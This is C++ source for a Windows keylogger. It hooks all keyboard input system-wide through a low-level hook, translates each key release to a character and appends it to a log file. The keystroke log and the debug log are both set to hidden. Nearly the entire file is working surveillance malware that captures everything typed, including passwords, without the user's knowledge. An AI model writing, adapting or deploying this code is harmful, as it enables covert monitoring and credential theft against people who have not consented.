#include <string>
#include <fstream>
#include <windows.h>
#include <iostream>

#include "key_listener_exports.h"
#include "key_listener_internals.h"

using namespace std;

static KeyListener *key_listener_main_logger_g = NULL;

KLOGGER_error_codes_t KLOGGER_init_klogger(string &dir_to_save_logs)
{
    KLOGGER_error_codes_t rc = UNDEFINED;
    if (NULL == key_listener_main_logger_g) {
        key_listener_main_logger_g = new KeyListener(dir_to_save_logs);
        rc = SUCCESS;
        goto Exit;
    }

    rc = ERROR_INIT_CALLED_MORE_THAN_ONCE;
Exit:
    return rc;
}

KLOGGER_error_codes_t KLOGGER_begin_logging(void)
{
    KLOGGER_error_codes_t rc = UNDEFINED;
    HHOOK keyboard_hook_handler;
    HINSTANCE current_module_handler = GetModuleHandle(NULL);
    MSG message;

    if (NULL == key_listener_main_logger_g) {
        rc = ERROR_BEGIN_LOGGING_CALLED_BEFORE_INIT;
        goto Exit;
    }

    keyboard_hook_handler = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        key_listener_press_callback_procedure,
        current_module_handler,
        0
        );

    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    UnhookWindowsHookEx(keyboard_hook_handler);

    rc = SUCCESS;
Exit:
    return rc;
}

static LRESULT CALLBACK key_listener_press_callback_procedure (
    int nCode,
    WPARAM wParam,
    LPARAM lParam
)
{
    key_listener_main_logger_g->fnPressCallback(nCode, wParam, lParam);
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

KeyListener::KeyListener (
	string &dir_to_save_logs
	) : key_logger{dir_to_save_logs, KEYLOGGER_FILE_NAME},
		debug_logger{dir_to_save_logs, KEYLOGGER_DEBUG_FILE_NAME}
{
    this->key_logger.hide();
    this->debug_logger.hide();
}

void KeyListener::fnPressCallback (
    int nCode,
    WPARAM wParam,
    LPARAM lParam
)
{
    KBDLLHOOKSTRUCT *keyboard_settings = (KBDLLHOOKSTRUCT *) lParam;
    LOGGER_Status_t log_rc = LOGGER_UNDEFINED;
    CHAR current_char = 0;
    BYTE keyboard_state[256] = {0};

    GetKeyboardState(keyboard_state);

    switch (wParam) {
        case WM_KEYUP:
            ToAscii(keyboard_settings->vkCode,
                    keyboard_settings->scanCode,
                    keyboard_state,
                    (LPWORD)&current_char,
                    0);
            log_rc = key_logger.LOGGER_log_line(&current_char, 1);
            if (LOGGER_SUCCESS != log_rc) {
                cout << "Failed to log with error: " << log_rc << endl;
                exit(log_rc);
            }
            break;
    }
}